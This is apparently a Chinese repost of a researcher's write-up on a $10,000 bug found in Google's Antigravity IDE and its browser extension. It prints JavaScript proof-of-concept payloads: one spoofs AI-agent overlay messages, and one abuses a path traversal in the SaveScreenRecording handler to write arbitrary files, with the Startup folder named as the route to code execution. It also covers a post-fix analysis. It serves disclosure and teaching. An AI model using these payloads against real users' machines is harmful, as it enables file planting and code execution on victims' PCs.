#  10000美元赏金的炼成：在Antigravity中实现远程代码执行  
原创 骨哥说事
                    骨哥说事  骨哥说事   2026-02-10 16:01  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/5311  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
在我们 **Hacking AI Browsers**  
 系列的延续中，我们又一次回归，这次的目标是 Google 的 Antigravity。  
  
几周前，Google 发布了一款新的集成开发环境，名为 **Antigravity**  
。根据相关推文和讨论，各位可能已经知道，其内部工作原理和所有其他方面都与 Windsurf IDE 相同。只要是关于 Windsurf 的任何事情，我们都可以算是老手了 咳咳  
。  
  
每当一个新的 AI 浏览器、IDE 或工具上市，就会上演一场寻找首个有影响力的漏洞的竞赛。这次 @s1r1us 很忙（在构建很酷的东西），所以轮到我寻找切入点并展开工作了。  
  
这款 Google IDE 自带一个浏览器。根据我们过去的经验，这是一个很有价值的目标。以下是 Antigravity IDE 工作流程及其如何与浏览器集成的简要说明：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZjktpLrvH5KFNibjaPYiaibbAEibiahYzic5WxBFw44MYG5GiaIA5va2Nu75Lnd4IOdlicx95TG9HibrT5Xkbp4JsSQG7A9DB8EIAbAvibYU/640?wx_fmt=png&from=appmsg "")  
  
流程图：Antigravity IDE 与浏览器交互  
  
这里用到了一个 VS Code 扩展，它与一个语言服务器交互。该服务器暴露了一系列 API 调用，负责处理任何任务，无论是来自 IDE 还是其他来源。  
  
使用如 **procexp.exe**  
 这样的工具，我们可以全面查看 Antigravity IDE 正在执行的内容。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZiaBGwJo5oHasRiaRLXuxZeGT4bXfs7fcRwyRLIswiapebCXRia22MEhnsvRsc41oGJh4uiaI18UJej9ARrIgmJWjDUuaHRX8k7Pic70/640?wx_fmt=png&from=appmsg "")  
  
进程信息截图  
  
首先来看语言服务器：  
```
d:\\Antigravity\\resources\\app\\extensions\\antigravity\\bin\\language_server_windows_x64.exe --enable_lsp --extension_server_port 19116 --csrf_token e8d42e20-02b4-4ec8-9156-6ce5d35d0f01 --random_port --cloud_code_endpoint <https://daily-cloudcode-pa.googleapis.com> --app_data_dir antigravity --parent_pipe_path \\\\.\\pipe\\server_8a46fdeaf98e6c96
```  
  
这个二进制文件负责运行服务器。端口在 extension_server_port  
 参数中指定，每次运行都是随机的。添加 csrf_token  
 标志是为了防范基于DNS重绑定的攻击，类似于之前 @s1r1us 发现的那种。  
  
语言服务器二进制文件也调用了 node.exe  
 二进制文件。查看命令行，我们看到了如下内容：  
```
C:\Users\STARK-PC\AppData\Local\ms-playwright-go\1.50.1\node.exe C:\Users\STARK-PC\AppData\Local\ms-playwright-go\1.50.1\package\cli.js run-driver
```  
  
所以它使用了 Playwright，这是一个用于控制浏览器自动化的库。IDE 的核心在于 language_server_windows_x64.exe  
 这个文件，它是用 Golang 编写的。  
  
在尝试使用这个 IDE 并寻找潜在风险点后，我得出了以下两个切入点，它们应该能让我找到足够有影响力的东西。  
## 攻克语言服务器  
  
这应该很容易实现，只需要找到一种泄露 CSRF（跨站请求伪造）令牌的方法。该令牌用于防范基于 DNS 重绑定的攻击，添加这个保护措施是为了应对 s1r1us 之前发现的问题。  
  
语言服务器会验证每个传入请求的 **x-codeium-csrf-token**  
 头部信息。  
  
第一步是理解 CSRF 令牌是如何生成的。通过检查位于 resources/app/extensions/antigravity/dist/extension.js  
 的扩展源代码，我们可以找到相关的代码路径：  
```
const n = crypto.randomUUID();await R.ExtensionServer.initialize(e, n) [...][...]t.startLanguageServer = async function(e, t) {   s = ["--enable_lsp", "--extension_server_port", e.extensionServerPort.toString(), "--csrf_token", e.csrfToken]
```  
  
根据 MDN 对 randomUUID  
 方法的描述，我们可以认为它是安全的，不像使用 Math.random  
 的情况那样可以预测。  
  
Web Crypto API: randomUUID() 方法 - Web API  
  
为了寻找 CSRF 令牌可能泄露的地方，我决定对语言服务器二进制文件进行字符串搜索，查看 CSRF 令牌值是如何被使用的。我搜索了类似 csrf token  
、csrftoken  
 等模式。  
  
我发现了一些有趣的内容。查看第 **[1]**  
 行，它使用了字符串格式化，其值可能是一个 JSON 对象。如第 **[2]**  
 行所示，它访问了 request.csrfToken  
 属性。根据注释可以清楚地看出，这个脚本是注入到浏览器中的。  
```
  (async function() {   try {    // 直接在 service worker 的全局作用域中设置凭据    const request = %s; // [1]    // 使用直接函数（Playwright 兼容性）    if (typeof globalThis.setCredentials === 'function') {     await globalThis.setCredentials(request.csrfToken, request.serverAddress); // [2]     // 如果函数存在，则初始化 RPC 客户端     if (typeof globalThis.initializeRpcClient === 'function') {      globalThis.initializeRpcClient();      // TODO(b/450106975): 发布后，弄清楚为什么我们在这里和 background.ts 中都调用 initializeRpcClient。其中一个调用是多余的。     }     return { success: true, message: 'WindsurfBrowser API 初始化成功' };    } else {     return { success: false, message: 'WindsurfBrowser API 不可用' };    }   } catch (error) {    console.error('设置凭据时出错:', error);    return { success: false, message: '错误: ' + error.toString() };   }  })()
```  
  
我还看到了与 CSRF 令牌相关的调用，比如：  
```
google3/third_party/jetski/extension_server_pb/extension_server_go_proto.(*LanguageServerStartedRequest).GetCsrfTokengoogle3/third_party/jetski/extension_server_pb/extension_server_go_proto.(*LanguageServerStartedRequest).SetCsrfToken
```  
  
然而，为了更好地理解语言服务器，必须对这个 Golang 二进制文件进行逆向工程。目前，我们不会专注于这个。  
  
由于 CSRF 令牌在 Playwright 脚本中使用，我决定检查浏览器，我们直接跳转到这一步。第一次打开内置浏览器时，你会被提示安装一个扩展。  
  
Antigravity 浏览器扩展 - Chrome 网上应用店  
  
这个扩展赋予 AI 代理与浏览器中打开的网页进行交互的能力。安装扩展后，你可以尝试使用它，例如，从聊天窗口你可以输入提示，比如 打开 example.com 并将背景颜色改为蓝色  
。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZjiafxcJcv8SqpqwlDNHwH6aaibpdBeT8omVwlkGBllbsx877otx0zJhkNEgxPicj5n1o8SLEKsP5QeYg1ELRdkWiatstaS7cPtw0w/640?wx_fmt=png&from=appmsg "")  
  
聊天窗口与浏览器交互截图1  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZhiardjTl8PAnIfwxvP6BXib1cIdCGWqyA2Fg9IEZGia71Ora6eZZlcOnicVpW7JParso8ntvCPsekNHoiaGQiaKicjiceT5hrwtWAaPLw/640?wx_fmt=png&from=appmsg "")  
  
聊天窗口与浏览器交互截图2  
  
这看起来很有趣，并给我们留下了一个问题：它是如何控制这一切的？回想一下之前我们看到 node.exe  
 被调用来运行 Playwright 的 cli.js  
 脚本。实际上，我们可以调试这个来更好地理解发生了什么。  
  
要调试 cli.js  
 脚本，我们可以修改代码以启用调试，或者尝试放置一个在执行 cli.js  
 时附加 --inspect  
 参数的代理 node.exe  
。不过，有一个更简单的方法，无需任何设置。  
  
我们还可以看到它在启动浏览器进程时使用了 --remote-debugging-port  
 标志。  
```
"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --remote-debugging-port=9223 --user-data-dir="C:\\Users\\STARK-PC\\.gemini\\antigravity-browser-profile" --disable-fre --no-default-browser-check --no-first-run --auto-accept-browser-signin-for-tests --ash-no-nudges --disable-features=OfferMigrationToDiceUsers,OptGuideOnDeviceModel --flag-switches-begin --flag-switches-end
```  
  
我说的简单方法是：直接获取你想调试的 Node 进程的 PID。在我的例子中，PID 是 **40632**  
，所以我将在终端中执行以下命令。  
```
node -e "process._debugProcess(40632)"
```  
  
然后在你的浏览器中打开 chrome://inspect/  
。从那里，我们应该能够调试 cli  
 进程。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZjS7Ol2qnhZK60KFbX7yJsjEJ2tZ2x8nIONY9jylxkDEd0iaELiaVZRwMcTYdibqMaxwJxN1EzJXezAniakAyW11RCIPCsLuaM8bKQ/640?wx_fmt=png&from=appmsg "")  
  
Chrome 开发者工具远程调试界面截图  
  
在扩展的 Service Worker 中，我们可以在 chrome-extension://eeijfnjmjelapkebgockoeaadonbchdd/service_worker_binary.js  
 找到一些 CSRF 令牌的使用引用。在第 **[5]**  
 行，你可以看到它将 this.Z  
 指定的值设置到 x-codeium-csrf-token  
 键。追溯这个值，我们发现它来自 self.setCredentials  
 方法，该函数的第一个参数应该包含 CSRF 令牌值。  
```
self.setCredentials = function(a, b) {    return va(function(c) {        eh = {    // [1]            Z: a,            V: b        };function oh() {    if (!eh)        throwError("Cannot initialize RPC client: no credentials");    var a = eh // [2]      , b = a.Z;        ya: [new nh(b,a)], // [3]    ...function nh(a, b) {    this.Z = a; // [4]    ...nh.prototype.intercept = function(a, b) {    a.metadata["x-codeium-csrf-token"] = this.Z; // [5]  
```  
  
现在，搜索 setCredentials  
 被调用的地方，我们没有找到结果。这很奇怪，因为那这个扩展到底是如何获取到 CSRF 令牌的呢？答案就在我们之前从语言服务器二进制文件的字符串结果中得到的那个脚本里。  
```
    const request = %s; // [1]    // Use the direct functions (Playwright compatibility)    if (typeof globalThis.setCredentials === 'function') {     await globalThis.setCredentials(request.csrfToken, request.serverAddress); // [2]     // Initialize the RPC client if the function exists     if (typeof globalThis.initializeRpcClient === 'function') {      globalThis.initializeRpcClient();
```  
  
这让一切都清楚了。上面的代码被注入到了 Antigravity 扩展的上下文中，globalThis.setCredentials  
 与 self.setCredentials  
 是同一个，而第一个参数显然是 CSRF 令牌。  
  
为了在浏览器中查看 Playwright 注入的内容脚本，我们需要在开发者工具中启用一个默认未启用的选项。在 **源代码 → 搜索**  
 下，启用 **在匿名和内容脚本中搜索**  
。这个技巧我是从 Masato Kinugawa 的发现中学到的。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZgjMfo2picOv4gl2CjVBVlJiaPcibUcx06ATBVNm38NZDLpxf1I9eiaF8ugibx4KuJOoNJDAs8sdlMlmD1pb4hwpdA53v0ibakpBjNFM/640?wx_fmt=png&from=appmsg "")  
  
开发者工具设置截图  
  
现在，如果你搜索 evaluate(  
，你应该能看到一些结果；如果不启用那个选项，结果会是零。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZiaWxXbG2w5ibaAKcHn2uTO4eeB3oOXGruxAwc3c3kbBNLwqAx0JAlpeOyqXRK9bB40ZoCGHic7ibLJWe4BhCfIAf8bpEKSdhjV57g/640?wx_fmt=png&from=appmsg "")  
  
搜索结果截图  
  
我在这里设置了一个断点，因为这个方法负责执行注入到页面中的内容脚本。它来自 Playwright 核心包中的一个文件。  
```
// packages/playwright-core/src/server/injected/utilityScript.tsvar UtilityScript = class {  constructor(isUnderTest) {    this.serializeAsCallArgument = serializeAsCallArgument;    this.parseEvaluationResultValue = parseEvaluationResultValue;    if (isUnderTest)      this._setBuiltins();  }  evaluate(isFunction, returnByValue, expression, argCount, ...argsAndHandles) {    const args = argsAndHandles.slice(0, argCount);
```  
  
evaluate  
 方法的第二个参数 expression  
 包含以下值：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZgWVSZdSibh44mXIbrlvPK1YrnKtGLXPCftQYwqV37UqwZyEtzpLcknYC4vz0dTyicyzEt4GrFTW9aLgP0iahwnTaOc2NRcqrq19M/640?wx_fmt=png&from=appmsg "")  
  
断点查看表达式值截图```
// Directly set the credentials in the service worker's global scopeconst request = {"action":"setCredentials","csrfToken":"f5d969c7-f4f3-4f87-aca7-8fa1568b6bd5","serverAddress":"http://127.0.0.1:64431"};
```  
  
看到这里，我想确认同样的脚本是否也会在网页上下文中被执行。但结果是，这只在扩展 Service Worker 的上下文中执行。所以没有办法泄露 CSRF 令牌。  
  
通过偶尔使用 Antigravity 代理的预期功能与网页交互，我可以实时查看哪些类型的脚本等被注入到普通页面中。  
  
有时这些被注入的脚本可能拥有额外权限，并且它们可能只在非常有限的时间内可用。例如，我就找到了这样一个案例。  
```
window.updateActuationOverlay({  "awaitingUserInput": false,  "cascadeId": "64821e8c-385d-452d-ba6b-3eb9fe597065",  "displayString": "Executing JavaScript..."})
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZgwDtZMUGIqGIjV2VKcNK4AXaiaZico5tLjdx98JtxLK2TLnqliatssDicTAhHKYicktGMSI7Odkc8U7Jjn7K51OMibJqeZGSbhVWe9c/640?wx_fmt=png&from=appmsg "")  
  
浏览器界面截图，显示代理状态  
  
updateActuationOverlay  
 用于在浏览器窗口中显示那些代理消息。例如，在上面的截图中，你可以看到它写着 “Agent needs your input”  
。  
  
我们可以再次搜索这个方法来找到它在隐藏内容脚本中的声明。这个方法除了显示关于 AI 代理的那个覆盖提示外，没有做任何事情。  
```
 window.updateActuationOverlay = t => {            Ga && clearTimeout(Ga);            const e = document.getElementById($a);            if (!e)                returnPromise.reject(newError("Failed to find shadow host"));            const n = e.shadowRoot;            if (!n)                returnPromise.reject(newError("Failed to find shadow root"));            const r = {                ...Za,                ...t            };            Za = "" === t.cascadeId ? {                ...qa,                ...t            } : r;            const i = n.querySelector("#preact-border-container");            return i && (0,            o.XX)(za(Xa, {                ...Za            }), i),            Za.cascadeId && (Ga = setTimeout( () => {                Za = {                    ...qa                },                i && (0,                o.XX)(za(Xa, {                    ...Za                }), i)            }            , 3e4)),            Ka()        }
```  
  
这个方法是可访问的，但仅在代理处于运行模式时临时可用；你可以看到那些蓝色的边界线作为指示。  
  
为了验证我的假设，我在我的服务器上托管了以下代码，并指示代理在其上执行一个任务。下面的代码每隔约10毫秒，就用一个任意的 displayString  
 键值调用 updateActuationOverlay  
 方法。  
```
<script>  setInterval(() => {    window.updateActuationOverlay({      awaitingUserInput: true,      cascadeId: "95651fd4-cc10-4e03-884d-f31953b7a13d",      displayString: "Shirley: Hello there sudi ;)",      passthroughEnabled: false    });  }, 10);</script>
```  
  
没过多久就确认成功了 😛  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZgiajCpxUN1NkIaFfnNRo5kHuvWY3GYNZnTHjldnsxh7RMkegu9tNPk15Hgxib2y2o7zMTvfMasoL8vlIv7lyQicWefqwqtt9dAibs/640?wx_fmt=png&from=appmsg "")  
  
显示自定义代理消息的浏览器截图  
  
除此之外，我花了相当多的时间去研究是否有其他允许我做有影响力事情的方法。既然我们在这里针对的是浏览器，像通用型 XSS 这样的漏洞也会很有影响力。但我运气不佳，没有找到类似的东西，似乎一切都仅限于 UI 功能且非常有限。  
  
这是一个失败的尝试，因为我最终没有找到任何有影响力的东西，但我仍然想分享这些细节。  
## 攻克浏览器扩展？  
  
于是我将目标转移到浏览器扩展本身，希望至少能在那里找到点什么。  
  
从扩展的源代码开始，审计扩展时我第一件事就是看 manifest.json  
 文件。  
  
这里的 externally_connectable  
 属性被设置为所有 URL，这意味着它允许白名单中的来源通过 chrome.runtime.connect()  
 / chrome.runtime.sendMessage()  
 与扩展通信。如果你想了解我们是如何攻克 Comet 浏览器的，可以参考 https://www.hacktron.ai/blog/perplexity-comet-uxss，因为我们当时利用了一个对该属性设置过于宽松的允许来源。  
```
   "externally_connectable": {      "matches": [ "\\u003Call_urls>" ]   }
```  
  
在 chrome-extension://eeijfnjmjelapkebgockoeaadonbchdd/service_worker_binary.js  
 中可以找到处理这个 postMessage  
 的代码：  
```
chrome.runtime.onMessageExternal.addListener(function(a, b, c) {    mh().then(function() {        return qh(a, b)
```  
  
我将总结一下你在这里可以执行的所有操作：  
```
function qh(a, b) {    var c, d, e, g, f, h, k, l, m, q, p, u, x, t, B;    return va(function(n) {        switch (n.g) {        case1:            if (a.action !== "rpcCall") {            }            [...]            return z(n, ah(d), 4);        case4:        case3:            if (c.method !== "validateCascadeOrCancelOverlay") {              [...]        case6:        case5:            if (c.method !== "smartFocusConversation") {              [...]        case8:        case7:        case2:            if (a && typeof a === "object" && a.action === "registerTargetID" && typeof a.targetId === "string") {              [...]            }            if (lg(a)) {                if (a.action === "getCurrentTabId")                    return n.return({                        tabId: ((l = b.tab) == null ? void0 : l.id) || null                    });                if (a.action === "serviceWorkerWakeUp")                if (a.action === "getMimeType")             [...]        case10:            return n.return(n.l);        case9:            if (!a || typeof a !== "object" || typeof a.type !== "string" || !["CHECK_JETSKI_CONNECTION", "ATTEMPT_JETSKI_CONNECTION"].includes(a.type)) {            if (a.type !== "CHECK_JETSKI_CONNECTION") {             [...]        case11:            if (!a || typeof a !== "object" || a.action !== "SaveScreenRecording" || typeof a.za !== "object" || typeof a.filename !== "string" || typeof a.L !== "string") {                n.g = 16;                break            }            B = new Qg;            Rg(B, newUint8Array(a.za));            cd(B, 2, a.filename);            cd(B, 3, a.L);            return z(n, dh(B).then(function() {}).catch(function() {}), 17);
```  
```
rpcCallvalidateCascadeOrCancelOverlaysmartFocusConversationregisterTargetIDgetCurrentTabIdserviceWorkerWakeUpgetMimeTypeCHECK_JETSKI_CONNECTIONSaveScreenRecording
```  
  
看起来有很多功能可以被触发。内容脚本中的一些示例代码展示了其中一些操作是如何被调用的。  
```
window.addEventListener("message", function(a) {    a.origin === window.location.origin && a.source === window && (a = a.data) && typeof a === "object" && a !== null && (a.action === "rpcCall" ? chrome.runtime.sendMessage(a).catch(function() {}) : a.action === "proxyRpcCall" ? a.method && a.requestId && chrome.runtime.sendMessage(a).catch(function() {}) : a.action === "registerTargetID" ? a.targetId && typeof a.targetId === "string" && chrome.runtime.sendMessage({        action: "registerTargetID",        targetId: a.targetId    }).catch(function() {}) : a.action === "startScreenRecording" ? chrome.runtime.sendMessage(a).catch(function() {}) : a.action === "stopScreenRecording" && chrome.runtime.sendMessage(a).catch(function() {}))});
```  
  
SaveScreenRecording  
 这个名字看起来非常有趣，所以我专门深入挖掘了这个功能。这个操作是从 chrome-extension://eeijfnjmjelapkebgockoeaadonbchdd/offscreen_binary.js  
 调用的：  
```
 if (c.g != 3) return h = c.o, k = new Uint8Array(h), A(c, chrome.runtime.sendMessage({                                target: "background",                                action: "SaveScreenRecording",                                K: Array.from(k),                                filename: "screen-recording-" + Date.now() + ".webm",                                H: a                            }), 3);
```  
  
根据消息处理代码中的 if  
 条件检查，它检查了一些在示例代码中不存在的属性，所以我把消息属性一个个提取出来。它期望 action  
 属性等于 SaveScreenRecording  
，za  
 键是对象类型，filename  
 是字符串类型，最后 L  
 也必须是字符串类型。  
```
const EXTENSION_ID = "eeijfnjmjelapkebgockoeaadonbchdd";chrome.runtime.sendMessage(EXTENSION_ID,{action:"SaveScreenRecording", za:{},"filename":"shirley",L:"aaa"})
```  
  
我进行了很多尝试和错误来猜测正确的格式。结果发现，结合示例代码中的键和上面提到的那些键，它似乎跳转到了下一个函数。  
  
za  
 键与 K  
 似乎是相同的。  
```
k = new Uint8Array(h)K: Array.from(k) // 通过使用下面的格式，我可以确保它与示例代码完全匹配，这也是一个很好的提示，表明这个键是用于文件内容的？ K: Array.from(new TextEncoder().encode(`shirley`))
```  
```
{action:"SaveScreenRecording","filename":"shirley",L:"aaa",za:Array.from(new TextEncoder().encode(`shirley`))}
```  
  
该调用最终到达这里，并向语言服务器 /exa.language_server_pb.LanguageServerService/SaveScreenRecording  
 端点发起请求，连同文件名等参数以及请求体中的内容。  
```
function dh(a) {    var b = Z;    return b.H.J(b.g + "/exa.language_server_pb.LanguageServerService/SaveScreenRecording", a, {}, Ug, void 0)}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZjE1wMOWqoeYL59fX2eocxCMJRQ8DrQ8tWBjpbkpYwkBJaVibDAK7XFvSx0gzPdxOqgX5cuBRjkvPz4rIiaN8tSjtPybLJcjm7rM/640?wx_fmt=png&from=appmsg "")  
  
网络请求截图  
  
这是扩展为 SaveScreenRecording  
 操作发送的请求。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZhLfl1CCdcZf8m2UH9gj1AjfVNTibl0R9JEvP7z77MicK1sib3s4Dlnz7j4jNJGrXlV3MnlVQYCQEqr2E4IdE850ePOB7RT7Fyn0Y/640?wx_fmt=png&from=appmsg "")  
  
网络请求详情截图  
  
这张截图最引人注目的部分是响应头部，主要是 **grpc-message**  
。  
  
无法保存视频文件: open C:\Users\STARK-PC.gemini\antigravity\brain\aaa\shirley: 系统找不到指定的路径。  
  
这个错误信息清楚地表明，它确实在尝试将录制内容保存到提供的位置。对于最终的文件路径，我们有两个地方可以控制。  
```
{  "action": "SaveScreenRecording",  "za": Array.from(new TextEncoder().encode(`shirley`)),  "filename": "shirley", // [1]  "L": "aaa", // [2]} 
```  
```
*C:\Users\<Username>\.gemini\antigravity\brain\aaa\shirleyC:\Users\<Username>\.gemini\antigravity\brain\[2]\[1]*
```  
  
由于最终目录不存在，文件写入操作很可能会失败，所以我下一步是看看是否允许路径遍历序列，比如 ../  
。  
  
将 L  
 键修改为 ../  
 返回以下错误，这导致了一种奇怪的路径。即使我增加遍历序列，它仍然返回相同的错误。  
  
无法保存视频文件: open Downloads\shirley: 系统找不到指定的路径。  
  
后来，我意识到我在路径上有两个注入点，我也可以在 filename  
 键中添加路径遍历序列。这成为了最终的有效载荷。  
```
const content = "shirley: hey sudi, I love you ;)";const bytes = new TextEncoder().encode(content);const EXTENSION_ID = "eeijfnjmjelapkebgockoeaadonbchdd"; // <-- 请将此更改为你自己的扩展ID (如果需要)function sendRecording() {    chrome.runtime.sendMessage(        EXTENSION_ID,        {            action: "SaveScreenRecording",            filename: "../poc.txt",            za:Array.from(bytes),            L:"../../../test",        },        (response) => {            console.log("来自扩展的响应:", response);        }    );}sendRecording()
```  
  
在我的例子中，我的用户名是 **STARK-PC**  
，所以一个新文件在 C:\Users\STARK-PC  
 目录下被创建为 C:\Users\STARK-PC\poc.txt  
，其中的任意内容完全由我控制。并且端点响应也不再显示相同的错误。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZhs7CwFyLkpibFh4xfpqmH0ibrqB0Bt7VEhQpMtskVicInXS7LcG2ROQwrUcZu3aGu3cib7BnM4YoDurARQfC2tmgvb2qnfeaKonGU/640?wx_fmt=png&from=appmsg "")  
  
成功写入文件后的网络请求响应截图  
  
还有一点需要指出：后来我意识到，即使这个错误被显示出来，文件实际上已经被保存到了正确的遍历路径。不要盲目相信错误信息 😛，在盲盒测试中，它们有时可能是致命的。  
  
无法保存视频文件：open Downloads\shirley：系统找不到指定的路径。  
  
所以，只要当前用户有权限写入该位置，这个漏洞基本上允许我们在受害者的 PC 上随意写入任何文件。一个简单的代码执行途径是写入用户的**启动文件夹**  
，在那里放置一个任意的可执行文件，下次系统重启时，该可执行文件将被自动执行。  
## 修复后分析  
  
Google 在后来的处理程序中添加了额外的检查以修复此问题。新添加的 sh  
 方法（第 [1] 行）验证了来源和其他一些属性，以确保消息仅在扩展上下文中被调用，而不是来自任何恶意页面。  
```
        case 11:            if (!a || typeof a !== "object" || a.action !== "SaveScreenRecording" || typeof a.za !== "object" || typeof a.filename !== "string" || typeof a.L !== "string") {                n.g = 16;                break            }            if (!sh(b)) // [1]                return n.return({                    success: !1,                    error: "Unauthorized: SaveScreenRecording only accepted from offscreen document"                });            if (!Z) {                n.g = 17;                break            }            B = new Qg;            Rg(B, newUint8Array(a.za));            cd(B, 2, a.filename);            cd(B, 3, a.L);            return z(n, dh(B).then(function() {}).catch(function() {}), 17); 
```  
```
function sh(a) {    var b, c, d = (c = (b = a.url) == null ? void 0 : b.includes("/static/offscreen.html")) != null ? c : !1;    b = a.id === chrome.runtime.id;    a = !a.tab;    return d && b && a} 
```  
  
他们添加了以下检查。在 sh  
 方法中，a  
 参数来自 addEventListener  
 回调（第二个参数，即 b  
）。如下所示，消息处理程序是使用 chrome.runtime.onMessageExternal.addListener  
 注册的，回调接收 (a, b, c)  
，然后 b  
 参数（代表发送者）被传递下来，并最终由 sh  
 方法验证。  
```
chrome.runtime.onMessageExternal.addListener(function(a, b, c) {    mh().then(function() {        return qh(a, b)
```  
  
sh  
 方法内部的第一个检查是：  
```
a.url // https://attacker.com/
```  
  
所以 b.includes("/static/offscreen.html")  
 检查很容易绕过。只需在网页 URL 中添加类似 ?/static/offscreen.html  
 的内容，我们就可以通过第一个检查。  
  
第二个检查是针对 chrome.runtime.id  
 的，预期返回 eeijfnjmjelapkebgockoeaadonbchdd  
（与扩展ID相同）。  
  
最后一个检查验证 a.tab  
 属性是否为 undefined  
 或 null  
；如果是，则评估为 true  
。  
```
return d && b && a
```  
  
如果你能在扩展的内容脚本中找到代理 postMessage  
 调用，也许可以绕过 chrome.runtime.id  
 检查。这类代码通常看起来像这样：  
  
chrome-extension://<someid>/content-script.js  
  
由于内容脚本被注入到网页中，滥用这样的代理可能使消息看起来像是从扩展上下文内部发出的。  
```
window.addEventListener("message", function(a) {        chrome.runtime.sendMessage(a)    })
```  
  
即使你能找到类似的东西，在 Antigravity 的例子中，你也可以看到一个类似的模式，但它已经有一些检查来约束你可以指定的操作类型，所以它并不是完全任意的。  
```
window.addEventListener("message", function(a) {    a.origin === window.location.origin && a.source === window && (a = a.data) && typeof a === "object" && a !== null && (a.action === "rpcCall" ? chrome.runtime.sendMessage(a).catch(function() {}) : a.action === "proxyRpcCall" ? a.method && a.requestId && chrome.runtime.sendMessage(a).catch(function() {}) : a.action === "registerTargetID" ? a.targetId && typeof a.targetId === "string" && chrome.runtime.sendMessage({        action: "registerTargetID",        targetId: a.targetId    }).catch(function() {}) : a.action === "startScreenRecording" ? chrome.runtime.sendMessage(a).catch(function() {}) : a.action === "stopScreenRecording" && chrome.runtime.sendMessage(a).catch(function() {}))});
```  
  
对于 a.tab  
 的最后一个检查，无法使其评估为 true  
。tab  
 属性只有在消息直接从扩展内部（例如从 Service Worker）调用时才会是 undefined  
。即使是从内容脚本调用，它也会包含 tab  
 属性。所以，即使我们能绕过前两个检查，第三个检查仍然会阻碍我们。  
## 结论  
  
随着 AI 驱动的浏览器日益普及，攻击面也随之显著扩大。使浏览器代理能够正常工作所需的特权 API，恰恰是当这些 API 没有得到妥善保护时，它们会变得危险的根源。  
  
这是我们研究的第三个 AI 浏览器，而且它们都暴露了强大的 API，存在过于宽松的允许列表。我们确信还有其他存在类似问题的浏览器。做好浏览器安全很难——即使是拥有深厚专业知识的团队也在为之努力。除非你面对的团队像 Google、OpenAI 或 Perplexity 那样在安全方面投入巨大，否则在安装那些闪亮的新 AI 浏览器之前，请三思。  
  
原文：  
https://www.hacktron.ai/blog/hacking-google-antigravity  
  
- END -  
  
**感谢阅读，如果觉得还不错的话，动动手指给个三连吧～**  
  
